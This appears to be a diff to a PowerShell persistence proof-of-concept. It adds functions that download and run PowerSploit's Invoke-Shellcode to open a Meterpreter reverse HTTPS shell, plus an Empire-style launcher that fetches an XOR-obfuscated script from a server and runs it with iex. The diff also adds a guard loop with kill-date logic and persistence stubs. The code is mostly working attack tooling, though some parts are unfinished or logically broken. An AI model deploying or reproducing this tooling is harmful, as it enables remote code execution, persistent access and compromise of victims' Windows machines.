@@ -8,12 +8,27 @@
 
 $persist = "cmd.exe /c powershell.exe -nop IEX (New-Object Net.Webclient).downloadstring('https://github.com/Gegitech/PowerShell-Persistence-POC/blob/master/persistence.ps1'); Run-Guard;"
 
+#This was too good to let go
 function Run-Meterpreter 
 {
     IEX (New-Object Net.Webclient).downloadstring(
     'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d0fff7b6371ccb52952268f47ae68e85c3aeeb91/CodeExecution/Invoke-Shellcode.ps1'
     )
     Invoke-Shellcode –Payload windows/meterpreter/reverse_https –Lhost $server –Lport $port –Force
+}
+
+#Taken from an Empire Launcher
+function Run-Empire
+{
+    param($server, $key)
+    $wc=new-object system.net.webclient;
+    $u='mozilla/5.0 (windows nt 6.1; wow64; trident/7.0; rv:11.0) like gecko';
+    $wc.headers.add('user-agent',$u);
+    $wc.proxy = [system.net.webrequest]::defaultwebproxy;
+    $wc.proxy.credentials = [system.net.credentialcache]::defaultnetworkcredentials;
+    $i=0;
+    [char[]]$b=([char[]]($wc.downloadstring("http://$server/index.asp")))|%{$_-bxor$key[$i++%$k.length]};
+    iex ($b-join'')
 }
 
 function Run-Child 
@@ -26,18 +41,42 @@ function Run-Child
 
 function Run-Guard
 {
+    param($date, $server)
     Set-Variable $process = $null
     while ($true)
     {
         if ($process) 
         {
             Sleep 60
-        } 
-        else 
+        }
+        elseif ((Check-DieDate -date $date) -or (Check-ServerDie -server $server))
+        {
+            exit
+        }
+        else
         {
             Run-Child $process
         }
     }
+}
+
+function Check-DieDate
+{
+    param($date)
+    if(Get-Date -format yyyyMMdd -ge $date)
+    {
+        return $false
+    }
+    else
+    {
+        return $true
+    }
+}
+
+function Check-ServerDie
+{
+    param($server)
+
 }
 
 function Persist-StartUpFolder 
@@ -104,8 +143,9 @@ function Persist-RegistryBlob
     
 }
 
-function Persist-WMI 
+function Persist-WMI
 {
+    param($filter, $consumer)
     #Just looked at what the powersploit guys did, this looks painful
 }
 
@@ -120,14 +160,6 @@ function Persist-UserProfilePS1
     {
         Write-Verbose "User profile file does not exists, use force to force it's creation"
     }
-}
-
-if ($persistence) 
-{
-    #method 1
-    #method 2
-    #method 3
-    #method 4
 }
 
 if ($child) 
